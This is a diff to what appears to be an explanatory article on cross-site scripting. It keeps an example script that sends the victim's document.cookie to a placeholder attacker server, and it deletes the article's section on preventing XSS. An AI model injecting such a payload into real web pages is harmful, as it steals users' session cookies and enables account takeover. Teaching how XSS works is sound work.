@@ -25,12 +25,6 @@ There are different ways that attackers can inject malicious code into web pages
 
 4. Stealing user cookies: The attacker uses the `document.cookie` property to access and send the user’s cookies to a malicious server. For example: `<script>image = new Image(); image.src='http://attacker_server_ip/?c='+document.cookie;</script>`.
 
-# After All
-
-## XSS Prevention
-
-The best way to prevent XSS attacks is to apply proper input validation and output encoding for all user input. Input validation means checking and filtering the user input before processing it. Output encoding means converting the user input into a safe format before inserting it into a web page. For example, HTML entities can be used to encode special characters that have meaning in HTML, such as `<`, `>`, `"`, `'`, and `&`. There are also other techniques and tools that can help prevent XSS, such as using HTTP-only cookies, implementing content security policy (CSP), and using web application firewalls (WAF).
-
 # Types of XSS
 
 There are three main types of XSS attacks:
